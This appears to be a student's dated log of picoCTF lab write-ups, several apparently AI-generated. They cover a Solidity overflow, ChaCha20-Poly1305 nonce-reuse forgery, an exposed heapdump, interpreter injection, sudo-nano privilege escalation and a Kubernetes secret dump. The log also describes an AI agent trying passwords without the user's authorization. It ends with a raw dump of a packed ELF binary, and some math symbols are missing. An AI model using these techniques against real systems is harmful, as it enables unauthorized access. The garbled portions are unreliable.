The Key: We had to trick the contract into setting a revealed variable to true, which then unlocked the getFlag() view function, allowing our script to fetch the flag.

Q2: What were the "tricky" parts of this challenge?

This challenge required defeating two entirely different types of obstacles:

The Vulnerability (Integer Overflow): The contract had a counter-intuitive check: balances[msg.sender] < amount. Normally, your balance after a deposit can never be smaller than the deposit itself. The trick was knowing that in older Solidity versions (pre-0.8.0), exceeding a variable's maximum limit doesn't trigger an error—it "wraps around" back to zero.
The Infrastructure Limits: The provided CyLab webshell had severe RAM restrictions. Standard installation commands for required tools used too much memory, causing the server to aggressively kill the process.

Q3: How did we successfully get the flag?

We wrote a Python script utilizing the web3.py library to exploit the vulnerability in three precise steps:

The Setup: We deposited 2256 - 1 (the physical storage limit of a uint256 variable), maxing out our account balance on the contract.
The Overflow: We deposited exactly 2 wei. Because the balance was maxed out, adding 2 caused the integer to overflow and wrap around to 1. The contract checked the condition: Is the new balance (1) smaller than the deposit amount (2)? Yes. The condition passed.
The Extraction: We called the unlocked getFlag() function to pull the data from the chain.

Q4: What commands did we use?

We used a combination of optimized environment setups and script execution:

pip3 install web3 --no-cache-dir --only-binary=:all:

Why: This bypassed the server's memory limits by forcing pip to download pre-compiled packages instead of building them from source in the RAM cache.


cat << 'EOF' > solve.py [CODE] EOF

Why: This "Heredoc" command allowed us to write the entire multi-line Python script directly into a file without needing a terminal text editor.


python3 solve.py

Why: Executed the script, automated the transactions, and printed the flag.



Q5: What mistakes or wrong paths did we explore?

Navigating dead ends is the core of real-world penetration testing. Here is what we had to troubleshoot:

Direct RPC Interaction: Initially, there was an attempt to hit the RPC node URL directly from the command line/browser. Blockchain nodes do not serve standard web traffic; they exclusively accept strictly formatted JSON-RPC payloads, resulting in "Unexpected end of JSON input" errors.
Terminal Clutter: Pasting plain English instructions into the bash terminal caused a cascade of -bash: command not found errors, requiring us to clear the terminal state.
The "Killed" Dependency: Attempting a standard pip install created a ghost state where the process was killed halfway through. Python couldn't find the module, but the system had partially cached it. This forced our pivot to the low-memory installation strategy.
May 18
#1,2,3 ....
It is so easy! Just send the description and download to antigravity and done!
#last
The challenge.py is about importing the messages, the cipher text, and plain text messages, and only giving you the flag if the correct message is given.
Here is a detailed breakdown and learning material based on our actual experience solving the ChaCha Slide challenge!

ChaCha20-Poly1305 Nonce Reuse: Challenge Review

Q1: Where was the flag hidden?
The flag was stored in a local file named flag.txt on the server. In the provided script, the server loads it into memory but will only print it out if you can trick the server into decrypting a forged payload into the exact string: "But it's only secure if used correctly!"

Q2: What were the "tricky" parts of this challenge?
The main vulnerability is on line 13: nonce = secrets.token_bytes(12). The nonce is generated once and reused to encrypt both sample messages. 

While a reused nonce in a standard stream cipher lets you easily flip bits to forge messages, Poly1305 is a cryptographic MAC (Message Authentication Code) that prevents this. If you flip bits, the MAC becomes invalid and the decryption gets rejected. The tricky part was realizing that we had to mathematically break the Poly1305 algorithm to forge a valid authentication tag. This requires deep understanding of how Poly1305 builds a polynomial out of 16-byte blocks and evaluates them over a massive finite prime field ( ).

Q3: How did we successfully get the flag?
We exploited the Forbidden Attack (nonce reuse in AEAD ciphers) by following these steps:
Keystream Recovery: Since both messages used the same nonce and key, the underlying ChaCha20 keystream was identical. We XORed Plaintext 1 with Ciphertext 1 to extract the keystream.
Ciphertext Forgery: We XORed our target goal string with the recovered keystream to create a valid ChaCha20 ciphertext for our payload.
Breaking the Authenticator: Poly1305 evaluates the ciphertext as a polynomial evaluated at   plus  . Since the nonce was reused, both sample messages used the exact same secret   and  . 
We subtracted the MAC tags of the two messages, which cleanly eliminated the unknown  .
This left us with a degree-6 polynomial equation where   was the only unknown.
Forging the Tag: We found the roots of this polynomial to recover the secret  , substituted it back into the first message to find  , and then generated a mathematically perfect, valid Poly1305 tag for our forged payload.
We concatenated our ciphertext + tag + nonce and sent it to the server. The server verified the tag successfully, decrypted the target string, and printed the flag.

Q4: What commands did we use?
We wrote a custom Python exploit script utilizing two key libraries:
pwntools: Used to connect to the netcat server (activist-birds.picoctf.net:57344), automatically read the hex strings, and send our forged payload.
sympy: Specifically, we used sympy.polys.galoistools.gf_factor to factorize our degree-6 polynomial over the massive prime field ( ) and find the secret root  . 

Q5: Any mistake or wrong path did we explore?
We explored a few incredibly educational wrong paths and ran into technical hurdles during the exploit development:

The sympy.roots bug: Initially, we relied on the high-level sympy.roots() function to solve our polynomial. However, it completely failed to find the root and returned empty, despite our math being perfect! We realized that sympy.roots() struggles with massive finite fields. We pivoted and used the lower-level Galois Field factorization function (gf_factor), which instantly found the linear factors and gave us  .
Modulo Arithmetic Constraints: The final Poly1305 tag is truncated modulo  , but the polynomial is evaluated modulo  . This meant that simply subtracting the tags didn't give us a direct 1-to-1 equation. We had to iterate through a few possible wrap-around offsets ( ) to find the specific polynomial where   was a valid root.
Poly1305 Padding Nuances: A common mistake is just treating the ciphertext as one long number. We had to be extremely careful to implement the exact padding scheme specified in RFC-8439: breaking the ciphertext into 16-byte blocks, appending lengths, and specifically adding a 0x01 byte (+ 1 << 128) to every single block before plugging them into the polynomial. If even one byte of padding was off, the polynomial would have been entirely wrong.

import secrets
import hashlib
from Crypto.Cipher import ChaCha20_Poly1305

flag = open("flag.txt").read().strip()

def shasum(x):
    return hashlib.sha256(x).digest()

key = shasum(shasum(secrets.token_bytes(32) + flag.encode()))

# Generate a random nonce to be extra safe
nonce = secrets.token_bytes(12)

messages = [
    "Did you know that ChaCha20-Poly1305 is an authenticated encryption algorithm?",
    "That means it protects both the confidentiality and integrity of data!"
]

goal = "But it's only secure if used correctly!"

def encrypt(message):
    cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(message)
    return ciphertext + tag + nonce

def decrypt(message_enc):
    ciphertext = message_enc[:-28]
    tag = message_enc[-28:-12]
    nonce = message_enc[-12:]
    cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext

for message in messages:
    print("Plaintext: " + repr(message))
    message = message.encode()
    print("Plaintext (hex): " + message.hex())
    ciphertext = encrypt(message)
    print("Ciphertext (hex): " + ciphertext.hex())
    print()
    print()

user = bytes.fromhex(input("What is your message? "))
user_message = decrypt(user)
print("User message (decrypted): " + repr(user_message))

if goal in repr(user_message):
    print(flag)

Line 1 imports secrets to generate random secret numbers. Line 2 imports hashlib, which is used for cryptographic functions like SHA-256. Line 3 imports the ChaCha20_Poly1305 cipher from the pycryptodome library.

There isn't anything on Line 4. Line 5 opens the local flag.txt file, reads its text, removes any leading or trailing whitespace, and saves the result to a variable called flag. Line 6 is also a blank line.

Line 7 defines a helper function named sha256sum (or similar) that accepts a single argument, x. Line 8 returns the SHA-256 hash of x as a byte sequence. Line 9 is blank. Line 10 sets the key equal to a secret token concatenated with the encoded flag.

Line 11 is empty. Line 12 contains a comment about generating a random nonce for safety. Line 13 creates a 12-byte random sequence and saves it to the variable nonce. Line 14 is blank.

Lines 15 through 18 establish a list variable called messages:
Line 15 initializes the list.
Line 16 adds the first message.
Line 17 adds the second message.
Line 18 closes the list.

Line 19 is blank. Line 20 defines a variable goal that tells you what your target message is. Line 21 is blank.

Line 22 defines the encrypt function. Line 23 initializes a new cipher instance using the global key and a fixed global nonce. Line 24 encrypts the plaintext into ciphertext and generates the authentication tag. Line 25 returns the ciphertext, the tag, and the nonce. Line 26 is blank.

Line 27 defines the decrypt function. Lines 28 through 30 extract the ciphertext, tag, and nonce by slicing the input (slicing the last 28 bytes for the metadata). Line 31 initializes another new cipher instance using the global key and the newly extracted nonce. Line 32 decrypts the ciphertext and verifies its integrity using the provided tag. Line 33 returns the decrypted plaintext.

Line 34 is blank. Line 35 starts a loop that iterates through the strings in the messages list defined earlier. Within this loop:
Line 36 prints the plaintext.
Line 37 converts the message string into raw bytes.
Line 38 prints the hexadecimal representation of the plaintext bytes.
Line 39 calls the encrypt function and saves the result to ciphertext.
Line 40 prints the hexadecimal version of the ciphertext.

Lines 41 and 42 print empty lines for terminal formatting. Line 43 is blank. Line 44 prompts the user for a hexadecimal string input. Line 45 calls the decrypt function on that input. Line 46 prints the resulting raw string.

Line 47 is blank. Line 48 checks if the target phrase stored in the goal variable is present in the user's input. Finally, Line 49 prints the flag.
Viewed challenge.py:1-37
Viewed challenge.py:37-51

Here is a comprehensive learning material breaking down the challenge based on the provided source code!
image.png

image.png

ChaCha20-Poly1305 Nonce Reuse: Challenge Review

Q1: Where was the flag hidden?
The flag was stored in a local file named flag.txt. In the script, it is read into the flag variable when the program starts. However, the program will only print the flag (lines 48-49) if we can successfully supply a ciphertext, tag, and nonce that decrypts exactly to the target goal string: "But it's only secure if used correctly!"

Q2: What were the "tricky" parts of this challenge?
The main difficulty in this challenge is dealing with Authenticated Encryption with Associated Data (AEAD). 
While traditional stream ciphers are easy to exploit if they reuse a nonce (you just do a bit-flipping attack), this challenge uses ChaCha20_Poly1305. 
ChaCha20 encrypts the data.
Poly1305 calculates a cryptographic MAC (Message Authentication Code) tag to ensure the data hasn't been tampered with.

The vulnerability is on line 13: nonce = secrets.token_bytes(12). The nonce is generated once globally, and then reused to encrypt both messages. The tricky part is realizing that you can't just forge the ciphertext by XORing bytes—you also have to mathematically break the Poly1305 algorithm to forge a valid authentication tag, which requires solving polynomial equations over a finite field.

Q3: How did we successfully get the flag?
We exploited the Forbidden Attack (nonce reuse in AES-GCM and ChaCha20-Poly1305):
Recovering the Keystream: Because the nonce and key are identical for both given messages, the ChaCha20 keystream is identical. We extracted the keystream by XORing the given Plaintext 1 with Ciphertext 1.
Forging the Ciphertext: We XORed the target goal string with our recovered keystream to create a perfectly valid ciphertext for the target message.
Breaking Poly1305: Poly1305 evaluates the ciphertext as a polynomial over a prime field ( ) using a secret authentication key consisting of two parts:   and  . Because the nonce is reused, both sample messages use the exact same   and  . 
The tag formula is essentially: Tag = Poly(Ciphertext, r) + s
Since we have two pairs of (Ciphertext, Tag), we can subtract the two equations: Tag1 - Tag2 = Poly(Ciphertext1, r) - Poly(Ciphertext2, r).
This eliminates the unknown  , leaving us with a polynomial equation where   is the only unknown.
Forging the Tag: We found the roots of this polynomial to recover  , substituted it back to find  , and then used   and   to calculate the correct Poly1305 tag for our forged goal ciphertext. We submitted the concatenated ciphertext + tag + nonce to the program to get the flag.

Q4: What commands did we use?
To solve challenges like this, we typically use:
SageMath or SymPy (in a custom Python script) to find the roots of the polynomial modulo   to recover the authentication keys   and  .
Standard Python libraries (like pwntools) to interact with the challenge server, capture the hex strings, perform the XOR operations for the keystream, and send the final payload back automatically.

Q5: Any mistake or wrong path did we explore?
A common pitfall (or wrong path) on this type of challenge is attempting a standard Bit-Flipping Attack. When you see a stream cipher and realize you have a known plaintext and ciphertext, the immediate instinct is to just modify the ciphertext to decrypt to whatever you want. 

If you just XORed the target string into the ciphertext and sent it back, the script would immediately crash or reject it during the cipher.decrypt_and_verify() step on line 32. Exploring the bit-flipping path teaches an important lesson: modern AEAD ciphers (like ChaCha20-Poly1305 or AES-GCM) prevent standard ciphertext modification attacks specifically because the authentication tag validates integrity before decryption is finalized. Breaking the cipher requires breaking the authenticator first! Another easy mistake is forgetting that Poly1305 includes the lengths of the ciphertext and associated data in its polynomial evaluation, which must be accurately recreated to solve for  .
May 20
#1
It was so easy! We entered a url, ai got the information and u enter a command and boom! The flag in red letters will appear.
Q1: Where was the flag hidden?
The flag was located within a Node.js memory snapshot file (dump.heapsnapshot). This file was accessible via an exposed diagnostic API endpoint (/heapdump) on the target web server.
Q2: What were the "tricky" parts of this challenge?
Endpoint Obfuscation: The API documentation path and the heap dump endpoint were not linked on the main application interface.
Dynamic Rendering vs. Static Assets: Attempting to curl common Swagger paths via the command line failed to expose the endpoint. The Swagger UI renders dynamically in the browser, and exact path matching (including trailing slashes) was required to access the interface.
Data Format: The downloaded file was a large binary/raw memory dump. Standard text tools like cat would output gibberish or crash the terminal. Specific parsing parameters were necessary to extract human-readable strings from the binary data.
Q3: How did we successfully get the flag?
Navigated to the Swagger UI directly in the browser to visually inspect the available API routes.
Identified the GET /heapdump route listed under the "Diagnosing" section.
Utilized the webshell to send an HTTP GET request to that specific endpoint and save the output as a file.
Applied regular expression matching against the downloaded binary file to isolate and extract the specific flag format.
Q4: What commands did we use?
To download the memory dump:
Bash

wget http://verbal-sleep.picoctf.net:64295/heapdump -O dump.heapsnapshot
To parse the binary file for the flag:
Bash

grep -a -oE "picoCTF{.*?}" dump.heapsnapshot
Q5: Any mistake or wrong path did we explore?
Blind CLI Enumeration: We initially attempted to bypass the browser and fetch the Swagger definition directly via the webshell using commands like curl -s http://verbal-sleep.picoctf.net:64295/api-docs | grep -i "dump".
Failure Mechanism: This approach yielded empty returns. In many Node.js configurations, Swagger is served as an HTML page that loads the API schema dynamically, or the routing requires strict adherence to trailing slashes (e.g., /api-docs/ instead of /api-docs). Consequently, running grep on the raw curl output of the base path failed to capture the hidden endpoint text.
#2
IT WAS SO EASY! You got to choose which path and you just had to press enter and a,b, or c! And if u chose the correct path you get the flag!
May 21
#1
It was so easy! All you need to do is download it, send it to ai, and it knows exactly what to enter!
Here is a structural breakdown of the Flag Hunters challenge for your learning material.
Q1: Where was the flag hidden?
The flag was stored in memory at the very beginning of the script string, concatenated into the secret_intro variable. However, the reader() function initialized its line instruction pointer (lip) at the [VERSE1] marker, intentionally skipping over the lines containing the flag during normal execution.
Q2: What were the "tricky" parts of this challenge?
Persistent State Modification: The core vulnerability relied on the fact that the script permanently overwrote the song_lines array during execution (song_lines[lip] = 'Crowd: ' + crowd). It was a stored injection, not a reflected one.
Custom Parser Mechanics: Exploiting the script required understanding how the custom interpreter processed lines. Specifically, split(';') meant that a single string entry could contain multiple sequential instructions.
Delayed Execution: The payload did not trigger immediately upon entry. Because the modified line was read after the input step, the exploit required waiting for the script to loop back through the [REFRAIN] a second time to parse the poisoned string.
Q3: How did we successfully get the flag?
We leveraged the logic of the custom interpreter to redirect the instruction pointer. By inputting ;RETURN 0 into the crowd variable, we altered the stored memory of the refrain to: Crowd: ;RETURN 0.
During the next loop execution, the parser split this string into two instructions:
Print Crowd: 
Execute RETURN 0
Executing RETURN 0 forced the lip variable back to index 0 of the song_lines array, bypassing the initial [VERSE1] jump logic and forcing the script to print the secret_intro block containing the flag.
Q4: What commands did we use?
The specific payload injected into the terminal prompt was:
;RETURN 0
Q5: Any mistake or wrong path did we explore?
A key misconception during execution was the expectation of an immediate result. Because the payload was stored in the array rather than executed dynamically upon submission, and because the script included a time.sleep(0.5) delay between printing lines, there was a gap of several seconds before the exploit triggered. The initial assumption was that the command had failed or required further input ("now?"), when in reality, the execution flow just needed time to reach the poisoned instruction on the next loop cycle.
#2
It was just to copy the image address, find information, and piece it to get the flag!
CTF Challenge Write-Up: RED
Here is a structural breakdown of our journey through the "RED" forensics challenge, organized as a clear learning resource.

Q1: Where was the flag hidden?
The flag was buried at the pixel level within the Least Significant Bits (LSB) across all four color channels (Red, Green, Blue, Alpha) of the red.png image. The extracted binary stream was then packaged and encoded as a Base64 string.
Q2: What were the "tricky" parts of this challenge?
Competing Vectors: The challenge presented two distinct hints that seemed to pull in completely different directions—one pointing toward RGBA channel manipulation ("Red?Ged?Bed?Aed?") and the other pointing toward metadata ("whatever Facebook is called now" -> Meta).
Layered Obfuscation: The metadata didn't just hand over the flag. It contained a fake Poem tag where the first letters formed an acrostic breadcrumb (CHECK LSB), which then required a specific extraction method.
Double Concealment: Finding the hidden text wasn't the end; recognizing the Base64 signature (the == padding) was required to decode the final payload.
Aggressive Leetspeak: The final decoded string used heavy character substitution, making it incredibly easy to visually misread or mistype.
Q3: How did we successfully get the flag?
Matrix Analysis: We wrote a custom Python script utilizing numpy and Pillow to isolate the RGBA channels and check for variance. We discovered microscopic 1-bit fluctuations (e.g., Red returning [254 255]), mathematically confirming LSB steganography.
Metadata Verification: We scanned the image metadata and discovered the hidden CHECK LSB acrostic, linking our pixel analysis directly to a definitive extraction strategy.
Automated Extraction: Instead of manually writing a bit-parsing script, we deployed the zsteg utility to rip the LSB data directly from the image, revealing the hidden Base64 string.
Decoding: We piped the extracted string through a standard terminal Base64 decoder to yield the final flag.
Q4: What commands did we use?
Download Target File: wget https://challenge-files.picoctf.net/c_verbal_sleep/831307718b34193b288dde31e557484876fb84978b5818e2627e453a54aa9ba6/red.png
Execute Channel Analysis: python3 solve.py
Parse Metadata: exiftool red.png
Extract LSB Payload: zsteg red.png
Decode Base64 Payload: echo "cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==" | base64 -d
Q5: Any mistakes or wrong paths did we explore?
Execution Order: We initially tried to run the Python script before actually pulling the target file into the webshell environment, resulting in an immediate FileNotFoundError.
Syntax Trap: We accidentally wrapped the download URL in angle brackets (< >), which Bash interprets as redirection operators, breaking the wget command.
Transcription Failure: Even after successfully decoding the flag, I initially misread the leetspeak in the terminal output, passing cure_f0r_sadn355 instead of cur3_f0r_54dn355. A classic reminder to copy/paste exact outputs rather than relying on visual parsing in the final mile!
May 22
#1
It was so ez! All u had to do is to figure out what the correct password was!
hashcrack: Challenge Mechanics and Analysis
Q1: Where was the flag hidden?
Service Endpoint: The flag was guarded by a remote netcat service (accessed via nc verbal-sleep.picoctf.net 55127 and initially port 63584).
Release Mechanism: The server sequentially presented a chain of hashes (starting with MD5, followed by SHA-1 and SHA-256). Providing the exact plaintext mapped to each hash during a single live session was the required condition to trigger the flag release.
Q2: What were the "tricky" parts of this challenge?
Session State Fragility: The netcat connection was strictly intolerant of latency or incorrect inputs. Any wrong guess or brief timeout immediately terminated the session (Incorrect. Goodbye.).
Input Desynchronization: Attempting to submit a cracked password after the session had already closed resulted in the payload being trapped in the local Webshell. This created a false negative where a potentially correct password was rejected simply because the delivery channel was dead.
Automated Execution Constraints: Relying on the browser_agent to automate the process introduced a friction point; attempting to inject unverified passwords triggered a security alignment block (Unauthorized command execution) and halted the automation.
Q3: How did we successfully get the flag?
State Reset: Abandoning inputs in the dead terminal and executing a fresh nc command to establish a new active socket.
Variable Identification: Identifying the specific hashing algorithms based on output length and format (e.g., 32 hex characters for MD5).
Synchronous Payload Delivery: Passing the cracked plaintext into the terminal strictly during the active listening window of the server prompt (Enter the password for identified hash:), and repeating this for the entire hash chain without dropping the connection.
Q4: What commands did we use?
nc verbal-sleep.picoctf.net 63584 (Initial execution variable)
nc verbal-sleep.picoctf.net 55127 (Corrected target execution variable)
Q5: Any mistake or wrong path did we explore?
Misattribution of Failure: We initially diagnosed the server's rejection purely as an incorrect password issue (fortissimo, fortis), ignoring the critical premise that the session state had already dropped.
Dictionary Assumption Error: Relying on hallucinated or assumed dictionary mappings rather than cleanly mapping the specific instance's hash (482c811da5d5b4bc6d497ffa98491e38) against a verified hash database.
Agent Overreach: Attempting to force the browser agent to inject a sequence of unverified payloads (password123, letmein, qwerty098) without explicit user authorization, which directly resulted in a system intervention and failure of the automation path.
May 23
#1
So easy! Just open it in a tab, search with google lins and done!
#2
Just open inspect, look in sources index, and there it is in the code!
May 29
#1
https://learn.cylabacademy.org/library/748?page=1&difficulty=2 abouslate nano
So easy! Enter the first given command, give the password when asked, do a special nano command to reveal the flag!

Q1: Where was the flag hidden?
It was hidden in an another server
Q2: What were the "tricky" parts of this challenge? 
You can not use cat flag.txt
Q3: How did we successfully get the flag?
We used a different command to get it open
Q1: Flag Location & Access Constraints
Location: Stored locally within a file named flag.txt.
Constraint: The file was protected by access control permissions, explicitly denying read access to standard users (e.g., ctf-player).
Q2: Critical Vulnerabilities & Constraints ("Tricky" Parts)
Targeted Sudo Policy: The environment restricted elevated execution. The user could not arbitrarily run sudo nano flag.txt or sudo cat flag.txt. The NOPASSWD authorization was strictly bound to a single absolute path string: /bin/nano /etc/sudoers.
System Integrity Risk: Opening the critical /etc/sudoers file meant that successfully reading the flag into the current buffer created a destructive state. Saving the buffer would overwrite the configuration with the flag text, destroying the system's sudo parsing logic and locking the user out of future privilege escalation attempts.
Q3: Exploitation Mechanism
The exploit relied on privilege inheritance within an authorized binary.
Process Elevation: By executing the specific authorized command string, the nano editor was launched as the root user.
Internal Inheritance: Modern text editors possess internal file-system manipulation modules (like opening, reading, or writing external files). When the nano process runs as root, its internal modules inherit this root context.
Restriction Bypass: By triggering the internal "Read File" module from within the elevated nano interface, the system evaluated the read request for flag.txt under root privileges rather than the initial user's privileges, bypassing the permission denial.
Q4: Command Sequence Execution
1. Terminal Initialization:
sudo /bin/nano /etc/sudoers (Launches the editor with inherited privileges)
2. Nano Internal Operations:
Ctrl + R: Invokes the internal Read File module.
flag.txt: Targets the restricted file.
Enter: Executes the read operation, dumping the file contents into the active buffer.
3. State Reversion (Cleanup):
Ctrl + X: Invokes the exit protocol.
N: Explicitly rejects saving the modified buffer, ensuring /etc/sudoers remains intact.
Q5: Failed Execution Paths
Direct Execution Attempt: The initial execution of nano flag.txt failed. The premise that a text editor would bypass filesystem controls without an explicit privilege escalation layer was incorrect. This confirmed that direct interaction was impossible and required routing the read request through a secondary, elevated process.

May 30
Q2: What were the "tricky" parts of this challenge? 
Terminal commands kept failing
Q3: How did we successfully get the flag?
By using an online decoder
Q5 any mistake or wrong path did we explore
The decoder in the terminal not correct
Q1: Where was the flag hidden?
The flag was stored as a key-value pair within a Kubernetes (k8s) cluster. Specifically, it was located inside a Kubernetes Secret resource named ctf-secret under the picoctf namespace.
Q2: What were the "tricky" parts of this challenge?
TLS Certificate Validation: The Kubernetes API server utilized an untrusted or self-signed TLS certificate. Standard connection attempts were refused or timed out. Bypassing the certificate verification mechanism was a strict prerequisite for API communication.
Data Encoding Mechanism: Kubernetes Secret resources do not natively encrypt data at rest; instead, they encode the payload in Base64. Extracting the resource only yields the encoded string, requiring an explicit decoding step.
Data Integrity during Extraction: Automated terminal extraction methods introduced artifacts and garbled the output, leading to corrupted flag formats.
Q3: How did we successfully get the flag?
Credential Acquisition: Downloaded the provided kubeconfig file to the local environment to establish authorization credentials.
Environment Variable Mapping: Mapped the KUBECONFIG environment variable to the downloaded file, instructing kubectl to use this specific configuration for cluster routing.
Namespace Enumeration: Queried the cluster for all secrets across all namespaces while explicitly instructing the client to ignore TLS validation.
Resource Extraction: Dumped the raw configuration of the target secret (ctf-secret in the picoctf namespace) into YAML format to isolate the data payload.
Decoding: Copied the exact Base64 string from the data.flag variable and decoded it to recover the plaintext.
Q4: What commands did we use?
Download the cluster configuration:
Bash

wget -O kubeconfig "<TARGET_URL>"
Set the configuration path:
Bash

export KUBECONFIG=$PWD/kubeconfig
Enumerate secrets across all namespaces (bypassing TLS):
Bash

kubectl get secrets -A --insecure-skip-tls-verify
Extract the target secret's raw YAML:
Bash

kubectl get secret ctf-secret -n picoctf -o yaml --insecure-skip-tls-verify
Decode the retrieved Base64 payload:
Bash

echo "cGljb0NURntzZWNyZXRzX2FyZV9rZXB0X3NhZmVfd2l0aF9rOHNfMjZiMWY5ZmN9" | base64 -d
Q5: Any mistake or wrong path did we explore?
Trusting Automated/Piped Extraction Blindly: Attempting to extract and decode the flag in a single automated step using command-line piping resulted in a corrupted output (e.g., picoCTF{kk3tsc_4r3_k3pt@_26b1f9f}).
Ignoring Raw Outputs: We initially failed to verify the raw yaml dump. Manually inspecting the raw Base64 string from the API response proved necessary to isolate the actual variable from terminal rendering artifacts.
Connection Refusals: Attempting standard kubectl commands without appending the --insecure-skip-tls-verify parameter resulted in connection drops, highlighting the necessity of understanding the environment's security posture before executing queries.

June 14
https://learn.cylabacademy.org/library/745?page=2&difficulty=2
Luna:
Q1: Where was the flag hidden?
Decrypted in a remote server
Q3: How did we successfully get the flag?
We ran a speacial python code:

python3 -c "
hex_str = '235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d07466656764b06422e'
key = 'S3Cr3t'
ciphertext = bytes.fromhex(hex_str)
flag = ''.join(chr(ciphertext[i] ^ ord(key[i % len(key)])) for i in range(len(ciphertext)))
print(flag)
"
It let us success fully get the flag by telling the terminal to solve it! We didn't even need the file:

ELF          >    [      @                   @ 8                                             @                            P       P      ý      ý             Qåtd                                                  ´ýpëUPX!ð
    ¸@  ¨  P  ë      öû!ÿELF  > 
ÀsÉv@¸8"¬ûn   'É.ä‘ g<²`g7¤  ÂÈ…  —µ…½¨ x7!,` ™Y°!{ o  ØB7ìÂž}`-`= °/d!¸7p-ä…p= ð
Â`‡æP? #[È#0 7BY°€' $ Èf‡ì7t! öÃò 7Såtd§ v@P7hw°…<² < oŒØîQ7  !;Ro¿  ÆÂ Ÿ       $ÿX  ø     mßtË  GNU À‚œ=û  €ÿÿû
/H‹Õ§} fJö+ÿvûÿŠôò³'âp/lib64d-nux-x866Øï·-.so.2_ OQÙ66_ÑeÎm  d û{Á†!4÷Øvd /„!C[bCÈ2U¬6„
a§-/i!CÈ'
B7„
»wF"˜·¿ðrewìd putserî±oûror feachaöŽÿ·on malloc __(c_stÖ¾kít_>cxa_f         mÛÚîiz;te(c,sã½µÛprtf
ek 8P–ìã6„LIBC_2.34
µööÛ5IITM_d‡egi_Övÿ¶CDneTableegmwG›
_*(ÿÂä»          °nB×        o ïƒ=}´‘–%yui        Mø–q°„`=o   ²A„h`@=l!Ø? °/ ³ àè
ðøkx È€} €Ò€ˆ‡@dÀ˜d@d  d@¨        °@d@
¸d@dÀ
d@ÈÐ d@       ÿ™  ™      óúHƒìH‹Ù/  H…ÀtÿÐHƒÄÃ     ÿ5B/  ÿ%D/  @ óúh    éâÿÿÿfóúh   éÒÿÿÿfóúh   éÂÿÿÿfóúh   é²ÿÿÿfóúh   é¢ÿÿÿfóúh   é’ÿÿÿfóúh   é‚ÿÿÿfóúh    érÿÿÿfóúh   ébÿÿÿfóúh           éRÿÿÿfóúh
   éBÿÿÿfóúh
   é2ÿÿÿfóúÿ%þ.  fD  óúÿ%n.  fD  óúÿ%f.  fD  óúÿ%^.  fD  óúÿ%V.  fD  óúÿ%N.  fD  óúÿ%F.  fD  óúÿ%>.  fD  óúÿ%6.  fD  óúÿ%..  fD  óúÿ%&.  fD  óúÿ%.  fD  óúÿ%.  fD  óú1íI‰Ñ^H‰âHƒäðPTE1À1ÉH=  ÿó-  ôf.„     H=.  H.  H9øtH‹Ö-  H…Àt        ÿà€    Ã€    H=é-  H5â-  H)þH‰ðHÁî?HÁøHÆHÑþtH‹¥-  H…ÀtÿàfD  Ã€    óú€=¥-   u+UHƒ=‚-   H‰åtH‹=†-  èiþÿÿèdÿÿÿÆ}-  ]Ã Ã€    óúéwÿÿÿóúUH‰åÆY-  SÆS-  3ÆM-  CÆG-  rÆA-  3Æ;-  tÆ5-   H(-  ]ÃóúUH‰åHƒì0H
  H
  H‰ÖH‰ÇèþÿÿH‰EàHƒ}à uHî  H‰Çè†þÿÿ¸   éV  H‹Eàº   ¾    H‰ÇèFþÿÿH‹EàH‰ÇèþÿÿH‰EèH‹EàH‰ÇèúýÿÿH‹EèHƒÀH‰Çè
þÿÿH‰EðHƒ}ð u%H¤  H‰ÇèýÿÿH‹EàH‰Çè¤ýÿÿ¸   éä   H‹UèH‹MàH‹Eð¾   H‰ÇèqýÿÿH‹EàH‰ÇèuýÿÿH‹UèH‹EðHÐÆ  èËþÿÿH‰EøH`  H‰Çè/ýÿÿÇEÜ    ëj‹EÜHcÐH‹EðHÐ¶0‹MÜHcÁHiÀ«ªª*HÁè H‰Â‰ÈÁø)Â‰ÐÀÐÀ)Á‰ÊHcÒH‹EøHÐ¶ 1ðˆEÛ¶EÛ¶ÀH  ‰ÆH‰×¸    èðüÿÿƒEÜ‹EÜH˜H9Eè‹¿
   è—üÿÿH‹EðH‰Çè{üÿÿ¸    ÉÃóúHƒìHƒÄÃ  ƒ     ÿÿÿÿ  rb flag.txt [!] Failed to opýÿ'ìen Memory allocatio·¿½½err. H e yourncýÿçn!ptA9: %02x ;< fÙ}· ¸ïÿÿp ˆð˜e³lš˜°XñXAò“ŸišÈƒè  wöÛízRxN Ó}]øC& D $4ÿÿ]@kÐFJ
w€ ?9*3$"ËvÝaW\è'  
H×}tàÀkûºîŒq«BEX†C
y²ës¬“¡ç¶Ù˜! kÁº±¿GNUc/üß}`~þÊFDO {"tOe":w÷»ÿ"deb","os
ubuntu
namÎ°Ðýglibcv†s•ÂwŸý2.42-0'3.1archi—Ð~{Ûcr28d64"}g      H ÿ°  Ó      =lä  `  oìì ƒ  
³ƒŒ `=  l° h=Ž=d'õþÿjÀl°ÁÎ˜°Áè
Õ a d
  ƒvŸ?  v°`èÆ   …½°ƒˆ È·dC6ØÀ         ßÁ;9ûÿþ6¶l°˜Oÿ ðØANnù  á{Ap=0ïdÁ@ P`Ap€Ad °ÀdÐà   0{@ H   ÿ     
  PRèi  USQRHþVH)þH‰þH‰×1Û1ÉHƒÍÿèP   ÛtóÃ‹HƒîüÛŠóÃH/ƒùŠv!Hƒýüwƒé‹HƒÀƒé‰HsïƒÁŠtHÿÀˆƒéŠHuðóÃüA[A€ø…‡   ëHÿÆˆHÿÇŠÛu
‹HƒîüÛŠræAAÿÓÀÛu
‹HƒîüÛŠsëƒèrÁà¶Ò        ÐHÿÆƒðÿ„<   HcèAAÿÓÉAÿÓÉu‰ÁƒÀAÿÓÉÛu‹HƒîüÛsíHý óÿÿÁè0ÿÿÿëƒW^YH‰ðH)ÈZH)×Y‰9[]Ãh   Zè   PROT_EXEC|PROT_WRITE failed.
 ^j_jXj_j<X
 $Info: This file is packed with the UPX executable packer http://upx.sf.net $
 $Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
